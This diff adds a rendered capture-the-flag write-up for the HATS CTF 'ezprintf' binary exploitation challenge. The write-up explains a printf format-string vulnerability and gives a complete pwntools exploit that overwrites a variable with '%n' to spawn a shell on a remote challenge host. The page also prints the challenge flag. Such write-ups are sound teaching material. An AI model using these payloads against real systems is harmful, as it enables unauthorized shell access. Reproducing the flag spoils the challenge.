@@ -1,0 +1,89 @@
+I"
+'<p><strong>Category:</strong> Binary Exploitation</p>
+
+<blockquote>
+  <p>Printf is wonky. Time to exploit its wonkyness.</p>
+
+  <p>nc challs.hats.sg 1304</p>
+
+  <p>Reading material:<br />
+https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf</p>
+</blockquote>
+
+<p><a href="https://github.com/MiloTruck/CTF-Archive/tree/master/HATS%20CTF/Binary%20Exploitation/ezprintf%20%5B496%5D" class="btn btn--primary">Challenge Files</a></p>
+
+<h2 id="write-up">Write-up</h2>
+<p>This challenge is a standard format string challenge.</p>
+
+<p>Here’s the simplified decompilation of <strong>main</strong>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">magic</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="mh">0x400</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">magic</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Obviously, the line <code class="highlighter-rouge">printf(input);</code> contains a format string vulnerability. The format string argument was missing from <code class="highlighter-rouge">printf</code>, which could be exploited to print and overwrite addresses on the stack.</p>
+
+<p>The objective of the challenge was to overwrite the value of <code class="highlighter-rouge">magic</code>, which would instantly give us a shell. However, the address of <code class="highlighter-rouge">magic</code> which was <code class="highlighter-rouge">0x0060106c</code>, contained a null byte, which would cause <code class="highlighter-rouge">printf</code> to stop “executing” our payload once the null byte was reached.</p>
+
+<p>To overcome this, the address of <code class="highlighter-rouge">magic</code> can be placed last in the payload. We can use the format specifier <code class="highlighter-rouge">%15$n</code> to overwrite <code class="highlighter-rouge">magic</code>, where <code class="highlighter-rouge">magic</code> is the 15th value on the stack to be printed. This ensures <code class="highlighter-rouge">magic</code> is overwritten before the null byte is reached.</p>
+
+<p>The payload contains the following:</p>
+<ol>
+  <li><code class="highlighter-rouge">"%x "*21</code>: Prints the first 21 arguments on the stack in hex. It allows us to locate the address of <code class="highlighter-rouge">magic</code> in the stack after including it in our payload.</li>
+  <li><code class="highlighter-rouge">"%15$n "</code>: The format specifier <code class="highlighter-rouge">%n</code> overwrites the next address on the stack with the number of bytes printed. This is used to overwrite <code class="highlighter-rouge">magic</code> with the number of bytes currently printed.</li>
+  <li><code class="highlighter-rouge">"BBB"</code>: This is used to align stack, ensuring the address of <code class="highlighter-rouge">magic</code> isn’t split up.</li>
+  <li>The address of <code class="highlighter-rouge">magic</code>.</li>
+</ol>
+
+<p>Here’s the final exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./ezprintf"</span><span class="p">,</span>
+    <span class="c1">#"libc" : "./",
+</span>    <span class="c1">#"ld" : "./",
+</span>    <span class="s">"HOST"</span> <span class="p">:</span> <span class="s">"challs.hats.sg"</span><span class="p">,</span>
+    <span class="s">"PORT"</span> <span class="p">:</span> <span class="mi">1304</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+	<span class="n">magic</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'magic'</span><span class="p">]</span> <span class="c1">#0x0060106c
+</span>	
+	<span class="n">payload</span> <span class="o">=</span> <span class="s">"%x "</span><span class="o">*</span><span class="mi">21</span> <span class="o">+</span> <span class="s">"%15$n "</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="s">"BBB"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic</span><span class="p">)</span>
+
+	<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
+
+    <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="n">config</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]:</span>
+        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>
+
+    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"remote"</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"HOST"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"PORT"</span><span class="p">])</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">():</span> 
+            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
+        <span class="k">else</span><span class="p">:</span> 
+            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
+
+        <span class="n">pause</span><span class="p">()</span>
+
+    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><strong>Flag:</strong> HATS{h3h1_that_w1z_3z}</p>
+:ET
